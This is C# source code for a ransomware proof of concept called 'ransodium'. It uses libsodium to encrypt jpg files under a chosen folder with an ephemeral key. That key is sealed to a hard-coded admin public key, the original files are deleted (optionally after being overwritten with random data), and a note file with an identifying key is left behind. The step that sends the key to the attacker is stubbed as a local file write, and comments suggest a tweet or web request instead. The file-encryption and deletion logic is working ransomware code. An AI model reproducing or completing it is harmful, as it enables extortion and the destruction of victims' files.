using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security;
using System.Threading.Tasks;
using Sodium;
using StreamCryptor;
using StreamCryptor.Helper;

namespace ransodium
{
    /// <summary>
    /// </summary>
    internal class Program
    {
        /// <summary>
        ///     The public key, of the admin (generated with: Sodium.PublicKeyBox.GenerateKeyPair()).
        /// </summary>
        private const string TargetPublicKeyHex = "a6da66193ac2004144a4eee0c7a805e02692b08d1f0d564a04f1f36ff6a5736d";

        /// <summary>
        ///     Use Parallel.ForEach.
        /// </summary>
        private const int ParallelUseBorder = 2000;

        /// <summary>
        ///     The file extension we put on the encrypted files.
        ///     This must he same as in the decryptor project.
        /// </summary>
        private const string EncryptedFileExtension = ".locked";

        /// <summary>
        ///     Overwrite the files with some random data, before we delete them.
        /// </summary>
        private const bool SecureRandomDelete = false;

        /// <summary>
        ///     Go recursively from main folder.
        /// </summary>
        private const string MainFolder = @"C:\ransodium";

        /// <summary>
        ///     The name of the file, we store the users public key and some info.
        /// </summary>
        private const string UserFile = "locked.txt";

        private static void Main()
        {
            // files to search for
            var searchPattern = new[] {"jpg"};
            try
            {
                var ephemeralKeyPair = PublicKeyBox.GenerateKeyPair();
                var nonce = PublicKeyBox.GenerateNonce();
                // we encrypt the ephemeral private key for the target public key
                var cipher = PublicKeyBox.Create(ephemeralKeyPair.PrivateKey, nonce, ephemeralKeyPair.PrivateKey,
                    Utilities.HexToBinary(TargetPublicKeyHex));

                var textToSendRemote =
                    Convert.ToBase64String(ArrayHelpers.ConcatArrays(nonce, ephemeralKeyPair.PublicKey, cipher));
                var textToShowTheUser =
                    string.Format(
                        "Your public key: {0}\nThis key is used to identify your private decryption key (on the admin site).",
                        Utilities.BinaryToHex(ephemeralKeyPair.PublicKey));
                cipher = null;
                nonce = null;
                var files = GetFiles(MainFolder, searchPattern);
                if (files.Count > ParallelUseBorder)
                {
                    Parallel.ForEach(files, file =>
                    {
                        Cryptor.EncryptFileWithStream(ephemeralKeyPair, file, null, EncryptedFileExtension, true);
                        if (SecureRandomDelete)
                        {
                            SecureDelete(file);
                        }
                        File.Delete(file);
                    });
                }
                else
                {
                    foreach (var file in files)
                    {
                        Cryptor.EncryptFileWithStream(ephemeralKeyPair, file, null, EncryptedFileExtension, true);
                        if (SecureRandomDelete)
                        {
                            SecureDelete(file);
                        }
                        File.Delete(file);
                    }
                }
                ephemeralKeyPair.Dispose();

                SendToRemoteServer(textToSendRemote);
                CreateUserFile(Path.Combine(MainFolder, UserFile), textToShowTheUser);
            }
            catch
            {
                /*  */
            }
        }

        /// <summary>
        ///     Write some text in a file.
        /// </summary>
        /// <param name="userFile">The file to write.</param>
        /// <param name="userMessage">The message.</param>
        internal static void CreateUserFile(string userFile, string userMessage)
        {
            try
            {
                File.WriteAllText(userFile, userMessage);
            }
            catch
            {
            }
        }

        internal static void SendToRemoteServer(string remoteMessage)
        {
            //Tweet it (140 chars)
            //Send it with a web request
            //...
            //
            //But for now: simulate with a local text file output
            CreateUserFile(Path.Combine(MainFolder, "admin.txt"), remoteMessage);
        }

        /// <summary>
        ///     Get a recursive file list.
        /// </summary>
        /// <param name="root">The root folder to start.</param>
        /// <param name="searchPattern">The file pattern to search for.</param>
        /// <returns></returns>
        /// <exception cref="ArgumentNullException"></exception>
        /// <exception cref="ArgumentException"></exception>
        internal static List<string> GetFiles(string root, string[] searchPattern)
        {
            var files = new List<string>();
            try
            {
                files.AddRange(
                    Directory.EnumerateFiles(root, "*.*")
                        .Where(file => searchPattern.Any(x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))));
                foreach (var directory in Directory.EnumerateDirectories(root))
                {
                    files.AddRange(
                        Directory.EnumerateFiles(directory, "*.*")
                            .Where(file => searchPattern.Any(x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))));
                }
            }
            catch (UnauthorizedAccessException)
            {
            }
            catch (PathTooLongException)
            {
            }
            catch (SecurityException)
            {
            }
            catch (DirectoryNotFoundException)
            {
            }
            catch (IOException)
            {
            }
            return files;
        }

        /// <summary>
        ///     Overwrite a file with random data, before deletion.
        /// </summary>
        /// <param name="file">The file to overwrite and delete.</param>
        /// <exception cref="FileNotFoundException"></exception>
        /// <exception cref="IOException"></exception>
        /// <exception cref="SecurityException"></exception>
        /// <exception cref="DirectoryNotFoundException"></exception>
        /// <exception cref="UnauthorizedAccessException"></exception>
        /// <exception cref="OverflowException"></exception>
        /// <exception cref="NotSupportedException"></exception>
        /// <exception cref="ArgumentNullException"></exception>
        /// <exception cref="ArgumentException"></exception>
        /// <exception cref="PathTooLongException"></exception>
        /// <exception cref="ArgumentOutOfRangeException"></exception>
        /// <exception cref="ObjectDisposedException"></exception>
        internal static void SecureDelete(string file)
        {
            if (!File.Exists(file)) return;
            const int maxBufferSize = 67108864; // 64MB
            using (var fileStream = new FileStream(file, FileMode.Open, FileAccess.Write, FileShare.None))
            {
                for (var size = fileStream.Length; size > 0; size -= maxBufferSize)
                {
                    var bufferSize = (size < maxBufferSize) ? size : maxBufferSize;
                    var buffer = new byte[bufferSize];
                    for (var bufferIndex = 0; bufferIndex < bufferSize; ++bufferIndex)
                    {
                        // overwrite with a random byte
                        buffer[bufferIndex] = (byte) (FastRandomGenerator.Next()%256);
                    }
                    fileStream.Write(buffer, 0, buffer.Length);
                    fileStream.Flush(true);
                }
            }
            File.Delete(file);
        }
    }
}